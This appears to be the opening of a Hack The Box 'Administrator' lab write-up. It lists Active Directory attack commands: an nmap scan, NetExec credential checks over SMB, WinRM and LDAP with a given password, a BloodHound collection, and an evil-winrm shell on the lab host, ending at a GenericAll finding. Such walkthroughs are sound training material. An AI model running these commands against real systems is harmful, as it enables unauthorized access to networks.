# -HTB-Administrator


### I start with nmap 

```
nmap -p- -sVC 10.10.11.42 -oN nmap_scan --min-rate 5000 -vv 
```

<img width="1249" height="859" alt="image" src="https://github.com/user-attachments/assets/8a686a15-54c8-4398-9589-1d8824e398cf" />


### I test the creds

```
Olivia:ichliebedich
```

```
nxc smb 10.10.11.42 -u "Olivia" -p "ichliebedich"
```

```
nxc winrm 10.10.11.42 -u "Olivia" -p "ichliebedich" 
```

<img width="1450" height="214" alt="image" src="https://github.com/user-attachments/assets/b98da1c7-a48e-4695-87c2-74feb9b5cb89" />


### I colect the zip for bloodhound 

```
nxc ldap DC.administrator.htb -u 'Olivia' -p 'ichliebedich'  --bloodhound --collection All --dns-tcp --dns-server 10.10.11.42
```

# Winrm -> Olivia

```
evil-winrm -i 10.10.11.42 -u "Olivia" -p 'ichliebedich'
```


### On BloodHound we can se Olivia have GenericAll to Michel 

<img width="1795" height="771" alt="image" src="https://github.com/user-attachments/assets/50091dc9-ffb8-490a-a3b8-9224432f9a80" />




